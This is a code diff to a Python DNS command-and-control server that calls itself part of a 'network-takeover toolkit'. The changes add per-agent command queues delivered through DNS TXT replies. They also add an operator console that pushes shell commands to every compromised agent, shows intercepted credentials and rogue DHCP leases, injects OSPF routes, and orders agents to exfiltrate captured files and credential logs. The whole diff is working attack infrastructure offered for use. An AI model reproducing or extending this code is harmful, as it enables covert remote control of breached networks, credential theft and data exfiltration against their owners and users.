@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v1.0
+# v1.1
 """
 c2_server.py — DNS C2 server for the network-takeover toolkit.
 
@@ -55,7 +55,8 @@ _DOMAIN_LEN: int = len(_DOMAIN_LABELS)
 
 # ── Shared mutable state ──────────────────────────────────────────────────────
 _cmd_lock = threading.Lock()
-_cmd_state = {"current": "NONE"}   # mutable dict avoids need for `global` keyword
+_cmd_state = {"current": "NONE"}   # broadcast to every agent polling command.<domain>
+_agent_cmds: dict = {}             # agent_id → cmd; per-agent slot, polled via command.<id>.<domain>
 
 _session_lock = threading.Lock()
 _sessions: dict = {}               # sid → {chunks: {idx: str}, total: int, src_ip: str}
@@ -276,12 +277,23 @@ def _handle(data: bytes, addr: tuple, sock: socket.socket) -> None:
         reply(_resp_ns(dns) if qtype == 2 else _resp_soa(dns))
         return
 
-    # command.<domain> — deliver queued operator command to agent
+    # command.<domain> — global broadcast command slot
     if sub == ["command"]:
         with _cmd_lock:
             cmd = _cmd_state["current"]
         payload = b"NONE" if cmd == "NONE" else _b32enc(cmd)
         print(f"[CMD] → {payload.decode()[:80]}")
+        reply(_resp_txt(dns, payload))
+        return
+
+    # command.<agent_id>.<domain> — per-agent command slot (checked first by dns_c2)
+    if len(sub) == 2 and sub[0] == "command":
+        agent_id = sub[1]
+        with _cmd_lock:
+            # Pop the per-agent command if one is queued; fall back to broadcast.
+            cmd = _agent_cmds.pop(agent_id, None) or _cmd_state["current"]
+        payload = b"NONE" if (not cmd or cmd == "NONE") else _b32enc(cmd)
+        print(f"[CMD-{agent_id}] → {payload.decode()[:80]}")
         reply(_resp_txt(dns, payload))
         return
 
@@ -356,15 +368,55 @@ def run_server(host: str = "0.0.0.0", port: int = 53) -> None:
 
 # ── Operator console ──────────────────────────────────────────────────────────
 
+_SHOW_SUBS = {"svis", "neighbors", "lsdb", "leases", "creds", "status"}
+
+
+def _queue_agent(agent_id: str, cmd: str, poll_interval: int) -> None:
+    """Store cmd in the per-agent slot and print a delivery hint."""
+    with _cmd_lock:
+        _agent_cmds[agent_id] = cmd
+    encoded = _b32enc(cmd).decode()
+    with _agents_lock:
+        known = agent_id in _agents
+    print(f"[*] Queued for {agent_id}: '{cmd}'")
+    print(f"    Encoded (b32) : {encoded}")
+    if not known:
+        print(f"    WARNING: agent {agent_id!r} not yet registered — command held until handshake")
+    else:
+        print(f"    Delivery      : within {poll_interval}s (next poll cycle)")
+
+
 def _console(poll_interval: int = 60) -> None:
-    print()
-    print("  Operator console ready.")
-    print("  bash <cmd>    queue shell command for ALL agents")
-    print("  clear         cancel pending command")
-    print("  agents        list registered agents")
-    print("  sessions      list in-progress reassembly sessions")
-    print("  q / quit      shut down")
-    print()
+    """
+    Operator console.  Per-agent commands use the targeted slots polled via
+    command.<agent_id>.<domain>; global commands use command.<domain>.
+
+    ── Global (broadcast to every agent) ──────────────────────────────────
+      bash <cmd>                  queue shell command for ALL agents
+      clear                       cancel the global pending command
+      agents                      list registered agents + last-seen age
+      sessions                    list in-progress chunk-reassembly sessions
+      q / quit                    shut down
+
+    ── Per-agent (targeted; use agent ID shown by 'agents') ───────────────
+      show <id> svis              OSPF Hello sources + LSDB subnets
+      show <id> neighbors         live OSPF neighbour table
+      show <id> lsdb              live LSDB entries
+      show <id> leases            active DHCP leases issued by rogue server
+      show <id> creds             intercepted traffic listing + credential log
+      show <id> status            brief agent status summary
+      inject <id> <prefix>        inject OSPF stub route (CIDR or addr/mask)
+      exfil <id>                  transmit all intercepted files + cred log
+      cmd <id> <raw>              send any raw command string to one agent
+    """
+    sep = "─" * 56
+    print(f"\n{sep}")
+    print("  DNS C2 Operator Console")
+    print(f"{sep}")
+    print("  Global : bash <cmd>  |  clear  |  agents  |  sessions  |  q")
+    print("  Target : show <id> <svis|neighbors|lsdb|leases|creds|status>")
+    print("           inject <id> <prefix>  |  exfil <id>  |  cmd <id> <raw>")
+    print(f"{sep}\n")
 
     while not _stop_event.is_set():
         try:
@@ -377,18 +429,22 @@ def _console(poll_interval: int = 60) -> None:
         if not line:
             continue
 
-        low = line.lower()
+        tokens = line.split(None, 3)   # up to 4 tokens: verb [id] [sub] [extra]
+        verb = tokens[0].lower()
 
-        if low in ("q", "quit"):
+        # ── Shutdown ──────────────────────────────────────────────────────────
+        if verb in ("q", "quit"):
             _stop_event.set()
             return
 
-        elif low == "clear":
+        # ── Global: cancel pending command ────────────────────────────────────
+        if verb == "clear":
             with _cmd_lock:
                 _cmd_state["current"] = "NONE"
-            print("[*] Command cleared — agents will receive NONE on next poll.")
+            print("[*] Global command cleared.")
 
-        elif low in ("agents", "list"):
+        # ── Global: list agents ───────────────────────────────────────────────
+        elif verb in ("agents", "list"):
             with _agents_lock:
                 snap = dict(_agents)
             if not snap:
@@ -405,7 +461,8 @@ def _console(poll_interval: int = 60) -> None:
                     print(f"  {aid:<14s}  {info['ip']:<18s}  {first:<10s}  {age}s ago")
                 print()
 
-        elif low == "sessions":
+        # ── Global: list in-progress reassembly sessions ──────────────────────
+        elif verb == "sessions":
             with _session_lock:
                 snap = {sid: dict(s) for sid, s in _sessions.items()}
             if not snap:
@@ -413,27 +470,47 @@ def _console(poll_interval: int = 60) -> None:
             else:
                 for sid, s in snap.items():
                     pct = int(100 * len(s["chunks"]) / max(s["total"], 1))
-                    print(
-                        f"  {sid}  {len(s['chunks'])}/{s['total']} ({pct}%)"
-                        f"  from={s['src_ip']}"
-                    )
+                    print(f"  {sid}  {len(s['chunks'])}/{s['total']} ({pct}%)  from={s['src_ip']}")
 
-        else:
-            # Queue whatever the operator typed as a shell command for all agents.
+        # ── Global: bash <cmd> — broadcast shell command to all agents ─────────
+        elif verb == "bash" and len(tokens) >= 2:
+            cmd = "bash:" + line[5:].lstrip()   # normalise to bash: prefix
             with _cmd_lock:
-                _cmd_state["current"] = line
-            encoded = _b32enc(line).decode()
+                _cmd_state["current"] = cmd
+            encoded = _b32enc(cmd).decode()
             with _agents_lock:
                 n = len(_agents)
-            print(f"[*] Command queued : '{line}'")
+            print(f"[*] Global command  : '{cmd}'")
             print(f"    Encoded (b32)   : {encoded}")
-            if n > 0:
-                print(
-                    f"    Pending agents  : {n}"
-                    f" — delivery within {poll_interval}s (next poll cycle)"
-                )
+            print(f"    Pending agents  : {n} — delivery within {poll_interval}s")
+
+        # ── Per-agent: show <id> <sub> ────────────────────────────────────────
+        elif verb == "show" and len(tokens) >= 3:
+            agent_id, sub = tokens[1], tokens[2].lower()
+            if sub not in _SHOW_SUBS:
+                print(f"[!] Unknown show target {sub!r}.  Choose: {', '.join(sorted(_SHOW_SUBS))}")
             else:
-                print("    No agents registered yet — command will be held until one connects.")
+                _queue_agent(agent_id, f"menu:{sub}", poll_interval)
+
+        # ── Per-agent: inject <id> <prefix> ──────────────────────────────────
+        elif verb == "inject" and len(tokens) >= 3:
+            agent_id, prefix = tokens[1], tokens[2]
+            _queue_agent(agent_id, f"menu:inject:{prefix}", poll_interval)
+
+        # ── Per-agent: exfil <id> ────────────────────────────────────────────
+        elif verb == "exfil" and len(tokens) >= 2:
+            agent_id = tokens[1]
+            _queue_agent(agent_id, "menu:exfil", poll_interval)
+
+        # ── Per-agent: cmd <id> <raw> — arbitrary targeted command ───────────
+        elif verb == "cmd" and len(tokens) >= 3:
+            agent_id = tokens[1]
+            raw = line.split(None, 2)[2]   # everything after "cmd <id>"
+            _queue_agent(agent_id, raw, poll_interval)
+
+        else:
+            print(f"[!] Unknown command: {line!r}"
+                  "  (type 'agents' for help, 'q' to quit)")
 
 
 # ── Entry point ───────────────────────────────────────────────────────────────
